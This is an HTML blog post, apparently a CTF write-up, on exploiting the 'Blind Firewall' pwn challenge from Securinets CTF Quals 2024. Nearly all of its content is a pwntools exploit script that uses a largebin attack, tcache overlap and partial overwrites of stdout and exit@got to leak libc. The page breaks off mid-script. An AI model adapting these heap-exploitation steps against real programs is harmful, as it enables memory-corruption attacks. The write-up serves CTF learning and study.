@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="During our participation in the Securinets CTF Quals 2024 with r3kapig last weekend, we encountered a pwnable challenge. I developed an exploit with an initial success rate of just under 1&#x2F;4096, but w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Securinets CTF Quals 2024: Blind Firewall">
+<meta property="og:url" content="https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="During our participation in the Securinets CTF Quals 2024 with r3kapig last weekend, we encountered a pwnable challenge. I developed an exploit with an initial success rate of just under 1&#x2F;4096, but w">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-17T08:51:30.000Z">
+<meta property="article:modified_time" content="2024-10-17T09:06:31.391Z">
+<meta property="article:author" content="Xia0o0o0o">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
+        
+      
+    
+    <!-- title -->
+    <title>Securinets CTF Quals 2024: Blind Firewall</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+      <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Home
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../index.html">
+                Home
+              </a>
+          </span>
+        </li>
+        <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Writing
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../archives/">
+                Writing
+              </a>
+          </span>
+        </li>
+        <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Projects
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
+                Projects
+              </a>
+          </span>
+        </li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="../../../07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&text=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&is_video=false&description=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Securinets CTF Quals 2024: Blind Firewall&body=Check out this article: https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&name=Securinets CTF Quals 2024: Blind Firewall&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&t=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Securinets CTF Quals 2024: Blind Firewall
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Xia0o0o0o</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-17T08:51:30.000Z" class="dt-published" itemprop="datePublished">2024-10-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag" style="text-decoration: none;">
+        <i class="fa-solid fa-tag"></i>
+        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a> <a class="tag-category" href="../../../../tags/PWN/" rel="tag">PWN</a> <a class="tag-category" href="../../../../tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>During our participation in the Securinets CTF Quals 2024 with r3kapig last weekend, we encountered a pwnable challenge. I developed an exploit with an initial success rate of just under 1/4096, but we struggled to exploit it remotely. After refining the exploit, I was able to increase the success rate to 1/256.</p>
+<p>The exploit targets stdout and the GOT table. Below is a working script for leaking the libc address. Once we obtain the libc address, the rest becomes straightforward since we already have a pointer to the GOT table.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_rule</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx))</span><br><span class="line">    sh.sendline(tob(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_rule</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx))</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_rule</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_rule</span>(<span class="params">idx1, idx2</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx1))</span><br><span class="line">    sh.sendline(tob(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_rule</span>(<span class="params">idx1, idx2</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx1))</span><br><span class="line">    sh.sendline(tob(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_in_data</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx))</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_out_data</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">    sh.sendline(tob(idx))</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause_shit_for_a_while</span>(<span class="params">t=<span class="number">0.1</span></span>):</span></span><br><span class="line">    sleep(t)</span><br><span class="line">    </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your ID: &#x27;</span>)</span><br><span class="line">_<span class="built_in">id</span> = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">log.success(<span class="string">&quot;id: &quot;</span>+<span class="built_in">hex</span>(_<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">0</span>, <span class="number">0x520</span>)</span><br><span class="line">add_rule(<span class="number">1</span>, <span class="number">0x550</span>)</span><br><span class="line">add_rule(<span class="number">2</span>, <span class="number">0x520</span>)</span><br><span class="line">add_rule(<span class="number">3</span>, <span class="number">0x520</span>)</span><br><span class="line">add_rule(<span class="number">4</span>, <span class="number">0x580</span>)</span><br><span class="line">add_rule(<span class="number">5</span>, <span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">6</span>, <span class="number">0x560</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">7</span>, <span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">8</span>, <span class="number">0x560</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">9</span>, <span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">delete_rule(<span class="number">2</span>)</span><br><span class="line">add_rule(<span class="number">6</span>, <span class="number">0x800</span>)</span><br><span class="line"></span><br><span class="line">delete_rule(<span class="number">5</span>)</span><br><span class="line">add_rule(<span class="number">5</span>, <span class="number">0x510</span>)</span><br><span class="line">setup_in_data(<span class="number">5</span>, p16(<span class="number">0xffff</span>&amp;((<span class="number">0x93c8</span>+(_<span class="built_in">id</span>&lt;&lt;<span class="number">12</span>))-<span class="number">0x20</span>))) <span class="comment"># perform largebin attack, 1/16</span></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">sh.send(<span class="string">b&#x27;\xe0&#x27;</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">link_rule(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete_rule(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete_rule(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">6</span>, <span class="number">0x800</span>)</span><br><span class="line"></span><br><span class="line">delete_rule(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit_rule(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x551</span>)+p64(<span class="number">0</span>)+p8(<span class="number">0xf0</span>))  <span class="comment"># point the fake tcache entry to the heap =&gt; overlap</span></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">6</span>, <span class="number">0x520</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">delete_rule(<span class="number">4</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">link_rule(<span class="number">7</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">edit_rule(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">setup_out_data(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p16(<span class="number">0xffff</span>&amp;(<span class="number">0xa840</span>+(_<span class="built_in">id</span>&lt;&lt;<span class="number">12</span>))))   <span class="comment"># 1/16, some interesting things after stdout</span></span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">copy_rule(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">9</span>, <span class="number">0x580</span>)</span><br><span class="line"></span><br><span class="line">edit_rule(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    setup_in_data(<span class="number">3</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Round <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pause_shit_for_a_while()</span><br><span class="line">    delete_rule(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">copy_rule(<span class="number">9</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;allocate to __nptl_rtld_global&quot;</span>)</span><br><span class="line">add_rule(<span class="number">9</span>, <span class="number">0x520</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">link_rule(<span class="number">9</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">setup_in_data(<span class="number">4</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">delete_rule(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">copy_rule(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">log.info(<span class="string">&quot;allocate to ld.so&quot;</span>)</span><br><span class="line">add_rule(<span class="number">9</span>, <span class="number">0x580</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">link_rule(<span class="number">9</span>, <span class="number">6</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;partially overwrite to get rules[]&quot;</span>)</span><br><span class="line">edit_rule(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p16(<span class="number">0x8140</span>)) <span class="comment"># 1/16 rules[]</span></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">setup_in_data(<span class="number">4</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">delete_rule(<span class="number">4</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">copy_rule(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">log.info(<span class="string">&quot;allocate to rules[]&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">9</span>, <span class="number">0x580</span>)</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;partially overwrite to stdout&quot;</span>)</span><br><span class="line">link_rule(<span class="number">7</span>, <span class="number">6</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">setup_out_data(<span class="number">6</span>, p64(<span class="number">0x1122334455667788</span>)+p16((<span class="number">0xa780</span>+(_<span class="built_in">id</span>&lt;&lt;<span class="number">12</span>))&amp;<span class="number">0xffff</span>))   <span class="comment"># stdout, if we hit </span></span><br><span class="line">pause_shit_for_a_while()                                                    <span class="comment"># the ld address previously</span></span><br><span class="line">                                                                            <span class="comment"># this will also hit stdout</span></span><br><span class="line">setup_in_data(<span class="number">4</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">delete_rule(<span class="number">4</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">copy_rule(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add_rule(<span class="number">2</span>, <span class="number">0x580</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">edit_rule(<span class="number">2</span>, p16((<span class="number">0xa780</span>+(_<span class="built_in">id</span>&lt;&lt;<span class="number">12</span>))&amp;<span class="number">0xffff</span>))<span class="comment">#b&#x27;\x80\xa7&#x27;)</span></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">sh.sendline(tob(<span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">sh.send(p16(<span class="number">0x8058</span>))                    <span class="comment"># exit@got, actually if we hit the rules[]</span></span><br><span class="line">pause_shit_for_a_while(t=<span class="number">1</span>)             <span class="comment"># this will also hit got entry of exit</span></span><br><span class="line">sh.send(p16(<span class="number">0x5863</span>))</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">sh.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">sh.sendline(tob(<span class="number">9</span>))</span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">sh.send(p16(<span class="number">0x5953</span>))                    <span class="comment"># main, 1/16</span></span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while(t=<span class="number">1</span>)</span><br><span class="line">sh.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">pause_shit_for_a_while()</span><br><span class="line">setup_in_data(<span class="number">2</span>, p64(<span class="number">0xfbad1803</span>)+p64(<span class="number">0</span>))</span><br><span 